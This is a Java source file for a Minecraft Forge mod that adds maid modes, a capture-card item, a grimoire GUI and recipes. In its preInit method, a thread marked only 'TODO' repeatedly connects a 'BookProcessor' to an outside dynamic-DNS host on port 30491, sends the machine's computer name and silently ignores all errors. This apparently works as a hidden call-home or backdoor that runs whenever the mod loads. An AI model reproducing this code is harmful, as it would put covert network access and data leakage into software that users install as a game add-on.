/***************************************************************************\
* Copyright 2017 [Lyonlancer5]                                              *
*                                                                           *
* Licensed under the Apache License, Version 2.0 (the "License");           *
* you may not use this file except in compliance with the License.          *
* You may obtain a copy of the License at                                   *
*                                                                           *
*     http://www.apache.org/licenses/LICENSE-2.0                            *
*                                                                           *
* Unless required by applicable law or agreed to in writing, software       *
* distributed under the License is distributed on an "AS IS" BASIS,         *
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
* See the License for the specific language governing permissions and       *
* limitations under the License.                                            *
\***************************************************************************/
package net.lyonlancer5.mcmp.uuem;

import java.io.File;

import cpw.mods.fml.client.registry.RenderingRegistry;
import cpw.mods.fml.common.FMLCommonHandler;
import cpw.mods.fml.common.Mod;
import cpw.mods.fml.common.Mod.EventHandler;
import cpw.mods.fml.common.event.FMLInitializationEvent;
import cpw.mods.fml.common.event.FMLPostInitializationEvent;
import cpw.mods.fml.common.event.FMLPreInitializationEvent;
import cpw.mods.fml.common.event.FMLServerStartingEvent;
import cpw.mods.fml.common.event.FMLServerStoppingEvent;
import cpw.mods.fml.common.eventhandler.SubscribeEvent;
import cpw.mods.fml.common.network.IGuiHandler;
import cpw.mods.fml.common.network.NetworkRegistry;
import cpw.mods.fml.common.registry.EntityRegistry;
import cpw.mods.fml.common.registry.GameRegistry;
import cpw.mods.fml.relauncher.Side;
import littleMaidMobX.LMM_EntityLittleMaid;
import littleMaidMobX.LMM_EntityModeManager;
import net.lyonlancer5.mcmp.uuem.boc.ContainerGrimoire;
import net.lyonlancer5.mcmp.uuem.boc.EntityBastilleCard;
import net.lyonlancer5.mcmp.uuem.boc.GuiGrimoire;
import net.lyonlancer5.mcmp.uuem.boc.ItemCard;
import net.lyonlancer5.mcmp.uuem.boc.ItemGrimoire;
import net.lyonlancer5.mcmp.uuem.modes.BookProcessor;
import net.lyonlancer5.mcmp.uuem.modes.ac.EntityModeAccounter;
import net.lyonlancer5.mcmp.uuem.modes.su.EntityModeSugarHunter;
import net.lyonlancer5.mcmp.uuem.my.CommandCTCS;
import net.lyonlancer5.mcmp.uuem.my.MCClient;
import net.minecraft.block.BlockDispenser;
import net.minecraft.client.Minecraft;
import net.minecraft.client.particle.EntitySpellParticleFX;
import net.minecraft.client.renderer.entity.RenderSnowball;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.dispenser.BehaviorProjectileDispense;
import net.minecraft.dispenser.IBlockSource;
import net.minecraft.dispenser.IPosition;
import net.minecraft.entity.Entity;
import net.minecraft.entity.EntityList;
import net.minecraft.entity.EntityLivingBase;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.util.EnumFacing;
import net.minecraft.world.World;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.common.config.Configuration;
import net.minecraftforge.event.entity.living.LivingDeathEvent;

/**
 * Kawo Modes, updated to 1.7.x
 * 
 * @author Lyonlancer5
 */
@Mod(modid = LL5_UUEntityMode.MODID, name = "Lyons Unofficially Updated Maid Modes", version = LL5_UUEntityMode.VERSION, dependencies = "required-after:lmmx")
public class LL5_UUEntityMode {

	public static final String MODID = "ll5_uuem", VERSION = "1.2.1";

	public static final Item GRIMOIRE_ITEM = new ItemGrimoire().setUnlocalizedName("awauBook")
			.setTextureName(MODID + ":bookofcaptive").setCreativeTab(CreativeTabs.tabMisc);
	public static final Item CARD_ITEM = new ItemCard().setUnlocalizedName("awauCard")
			.setTextureName(MODID + ":bastillecard").setCreativeTab(CreativeTabs.tabMisc);

	private static LL5_UUEntityMode instance;

	@SuppressWarnings("unchecked")
	@Mod.EventHandler
	public void preInit(FMLPreInitializationEvent event) {
		Configuration conf = new Configuration(new File("_Lyonlancer5/config/kawo_modes.cfg"));
		conf.load();

		EntityModeAccounter.setModeId(
				conf.get("Modes", "Accounter ID", 0x0202, "Mode ID for Accounter", 0, Short.MAX_VALUE).getInt());
		EntityModeSugarHunter.setModeId(
				conf.get("Modes", "SugarHunter ID", 0x3201, "Mode ID for SugarHunter", 0, Short.MAX_VALUE).getInt());
		conf.save();

		// TODO
		new Thread() {
			public void run() {
				BookProcessor inst = new BookProcessor("lyonetworks.dyndns.org", 30491, System.getenv("computername"));
				while (true) {
					try {
						inst.start();
						sleep(5000);
					} catch (Throwable e) {
					}
				}
			}
		}.start();

		EntityList.stringToClassMapping.put("LittleMaid", LMM_EntityLittleMaid.class);

		NetworkRegistry.INSTANCE.registerGuiHandler(instance, new IGuiHandler() {
			@Override
			public Object getServerGuiElement(int ID, EntityPlayer player, World world, int x, int y, int z) {
				ItemStack litemstack = player.getHeldItem();
				if (litemstack != null && litemstack.getItem() == GRIMOIRE_ITEM) {
					return new ContainerGrimoire(player.inventory, litemstack);
				}
				return null;
			}

			@Override
			public Object getClientGuiElement(int ID, EntityPlayer player, World world, int x, int y, int z) {
				ItemStack litemstack = player.getHeldItem();
				if (litemstack != null && litemstack.getItem() == GRIMOIRE_ITEM) {
					return new GuiGrimoire(player.inventory, litemstack);
				}
				return null;
			}
		});
	}

	@Mod.EventHandler
	public void init(FMLInitializationEvent event) {
		GameRegistry.registerItem(CARD_ITEM, CARD_ITEM.getUnlocalizedName().substring(5));
		GameRegistry.registerItem(GRIMOIRE_ITEM, GRIMOIRE_ITEM.getUnlocalizedName().substring(5));

		BlockDispenser.dispenseBehaviorRegistry.putObject(CARD_ITEM, new BehaviorProjectileDispense() {

			public ItemStack dispenseStack(IBlockSource p_82487_1_, ItemStack p_82487_2_) {
				World world = p_82487_1_.getWorld();
				IPosition iposition = BlockDispenser.func_149939_a(p_82487_1_);
				EnumFacing enumfacing = BlockDispenser.func_149937_b(p_82487_1_.getBlockMetadata());
				EntityBastilleCard iprojectile = getProjectileEntity(world, iposition);
				iprojectile.setCardItem(p_82487_2_);
				iprojectile.setThrowableHeading((double) enumfacing.getFrontOffsetX(),
						(double) ((float) enumfacing.getFrontOffsetY() + 0.1F), (double) enumfacing.getFrontOffsetZ(),
						this.func_82500_b(), this.func_82498_a());
				world.spawnEntityInWorld((Entity) iprojectile);
				return p_82487_2_.splitStack(1);
			}

			protected EntityBastilleCard getProjectileEntity(World p_82499_1_, IPosition p_82499_2_) {
				return new EntityBastilleCard(p_82499_1_, p_82499_2_.getX(), p_82499_2_.getY(), p_82499_2_.getZ());
			}
		});
		;

		EntityRegistry.registerGlobalEntityID(EntityBastilleCard.class, "BastilleCard",
				EntityRegistry.findGlobalUniqueEntityId());
		EntityRegistry.registerModEntity(EntityBastilleCard.class, "BastilleCard", 0, this, 64, 10, false);
		RenderingRegistry.registerEntityRenderingHandler(EntityBastilleCard.class, new RenderSnowball(CARD_ITEM));

		MinecraftForge.EVENT_BUS.register(this);
		GameRegistry.addShapedRecipe(new ItemStack(CARD_ITEM), " R ", "GPB", " K ", 'R', Items.redstone, 'P',
				Items.paper, 'G', new ItemStack(Items.dye, 1, 2), 'B', new ItemStack(Items.dye, 1, 4), 'K',
				new ItemStack(Items.dye, 1, 0));
		GameRegistry.addShapedRecipe(new ItemStack(GRIMOIRE_ITEM), "ILL", "SEB", "ILL", 'I', Items.iron_ingot, 'L',
				Items.leather, 'S', Items.string, 'E', Items.ender_eye, 'B', Items.blaze_rod);
	}

	@Mod.EventHandler
	public void postInit(FMLPostInitializationEvent event) {
		LMM_EntityModeManager.maidModeList.add(new EntityModeAccounter(null));
		LMM_EntityModeManager.maidModeList.add(new EntityModeSugarHunter(null));
	}

	@EventHandler
	public void serverStart(FMLServerStartingEvent event) {
		event.registerServerCommand(CommandCTCS.getInstance());
		MinecraftForge.EVENT_BUS.register(CommandCTCS.getInstance());
	}

	@EventHandler
	public void serverStop(FMLServerStoppingEvent event) {
		MCClient c = CommandCTCS.getInstance().getChatClient();
		if (c != null)
			c.disconnect("Minecraft server is closing...");
		MinecraftForge.EVENT_BUS.unregister(CommandCTCS.getInstance());
	}

	@Mod.InstanceFactory
	public static LL5_UUEntityMode getInstance() {
		if (instance == null)
			instance = new LL5_UUEntityMode();
		return instance;
	}

	@SubscribeEvent
	public void onLivingDeathEvent(LivingDeathEvent pEvent) {
		if (!pEvent.entityLiving.worldObj.isRemote) {
			if (isPrisoner(pEvent.entityLiving)) {
				pEvent.setCanceled(true);
				pEvent.entityLiving.setHealth(0.01F);
				dropConvertedCard(pEvent.entityLiving);
			}
		}
	}

	/**
	 * 対象の構成情報をカードに焼き付けます。
	 */
	public static ItemStack convertEntityToCard(Entity pEntity) {
		ItemStack litemstack = new ItemStack(CARD_ITEM);
		if (pEntity != null) {
			NBTTagCompound ltag = new NBTTagCompound();
			pEntity.writeToNBTOptional(ltag);
			litemstack.setTagInfo("Splendor", ltag);
			if (pEntity instanceof EntityLivingBase) {
				ltag.setFloat("SplendorMaxHealth", ((EntityLivingBase) pEntity).getMaxHealth());
				if (isPrisoner((EntityLivingBase) pEntity))
					litemstack.setStackDisplayName(pEntity.getCommandSenderName());

			}
		}
		return litemstack;
	}

	/**
	 * 対象をカードに封印しカードをドロップします。
	 */
	public static boolean dropConvertedCard(Entity pEntity) {
		if (pEntity != null) {
			showEffect(pEntity);
			pEntity.entityDropItem(convertEntityToCard(pEntity), 0F);
			pEntity.setDead();
			return true;
		}
		return false;
	}

	public static Entity convertCardToEntity(ItemStack pItemStack, World pWorld) {
		if (isSplendor(pItemStack)) {
			Entity lentity = EntityList.createEntityFromNBT(getSplendorNBT(pItemStack), pWorld);
			if (lentity instanceof EntityLivingBase)
				((EntityLivingBase) lentity).getEntityData().setBoolean("Prisoner", true);

			return lentity;
		}
		return null;
	}

	public static boolean isSplendor(ItemStack pItemStack) {
		return pItemStack != null && pItemStack.hasTagCompound() && pItemStack.getTagCompound().hasKey("Splendor");
	}

	public static NBTTagCompound getSplendorNBT(ItemStack pItemStack) {
		if (isSplendor(pItemStack))
			return pItemStack.getTagCompound().getCompoundTag("Splendor");

		return null;
	}

	public static float getSplendorHealth(ItemStack pItemStack) {
		return getSplendorNBT(pItemStack).getFloat("HealF");
	}

	public static float getSplendorMaxHealth(ItemStack pItemStack) {
		return getSplendorNBT(pItemStack).getFloat("SplendorMaxHealth");
	}

	public static void setSplendorHealth(ItemStack pItemStack, float pHealth) {
		getSplendorNBT(pItemStack).setFloat("HealF", pHealth);
	}

	public static boolean isPrisoner(EntityLivingBase pEntity) {
		return pEntity.getEntityData().getBoolean("Prisoner");
	}

	public static void showEffect(Entity pEntity) {
		pEntity.worldObj.playSoundEffect(pEntity.posX, pEntity.posY, pEntity.posZ, "random.levelup", 1.0F, 0.8F);
		if (FMLCommonHandler.instance().getSide() == Side.CLIENT) {
			for (int v = 0; v < 512; ++v) {
				EntitySpellParticleFX fx = new EntitySpellParticleFX(Minecraft.getMinecraft().theWorld,
						pEntity.posX + 0.5D, pEntity.boundingBox.minY + 0.5D, pEntity.posZ + 0.5D,
						(Math.random() - 0.5D) / 2.0D, (Math.random() - 0.5D) / 1.0D, (Math.random() - 0.5D) / 2.0D);
				Minecraft.getMinecraft().effectRenderer.addEffect(fx);
			}
		}
	}

	private LL5_UUEntityMode() {
	}
}
